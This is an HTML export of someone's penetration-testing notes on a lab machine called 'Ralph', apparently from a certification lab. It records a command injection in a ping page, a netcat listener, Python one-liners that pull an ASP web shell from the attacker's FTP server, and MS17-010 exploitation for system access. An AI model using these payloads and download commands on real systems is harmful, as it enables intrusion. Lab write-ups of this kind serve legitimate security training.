<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>31 Ralph</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>31 Ralph</h1><br/>nmap showed that 80 and smb were open (as well as many others)<br />nikto and dirsearch gave me very little<br />smbmap with a -p gofuckyourself showed that there was a \_vti_pingit\pingit.py and .html<br /><a href="http://10.11.1.31/_vti_pingit/pingit.html">http://10.11.1.31/_vti_pingit/pingit.html</a> allowed you to ping an IP<br />give it a 10.11.0.186 &amp; whoami ....  BOOM code execution<br />using a python webshell worked but was trash, so we moved on to the ftp upload trick<br />start nc listener<br />standing up a python ftp server on my kali and makeing a file to pull from it on the target then navigating to that file did the trick!<br />whoami              nt authority\network service         ... damn<br />        ^^I never did figure out how to pirvesc from here^^<br />        <br />        <br />nmap vulnscan for smb showed that the machine was vulnerable to ms17-010. Metasploit reinforced this theory and got me root<br /><br /><br /><br /><br /><br /><br /><br />------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br /><br /><br />ON KALI<br />apt-get install python-pyftpdlib<br />python -m pyftpdlib -p 21 -w<br /><br />ON TARGET<br />echo import ftplib &gt; yeet.txt<br />echo ftp=ftplib.FTP(&#39;10.11.0.186&#39;) &gt;&gt; yeet.txt                                                          &lt;&lt;&lt;CHANGE IP<br />echo ftp.login(&#39;anonymous&#39;,&#39;x&#39;) &gt;&gt; yeet.txt<br />echo ftp.retrbinary(&#39;RETR 3232.asp&#39;,open(&#39;3232.asp&#39;,&#39;wb&#39;).write) &gt;&gt; yeet.txt           &lt;&lt;&lt;REPLACE FILES<br />echo ftp.quit() &gt;&gt; yeet.txt<br /><br />OR<br /><br />c:\python27\python.exe -c &quot;import ftplib;ftp=ftplib.FTP(&#39;10.11.0.186&#39;);ftp.login(&#39;anonymous&#39;,&#39;x&#39;);ftp.retrbinary(&#39;RETR 3232.asp&#39;,open(&#39;3232.asp&#39;,&#39;wb&#39;).write);ftp.quit()&quot;<br /><br />^^STILL CHANGE IP AND FILENAMES</div></body></html>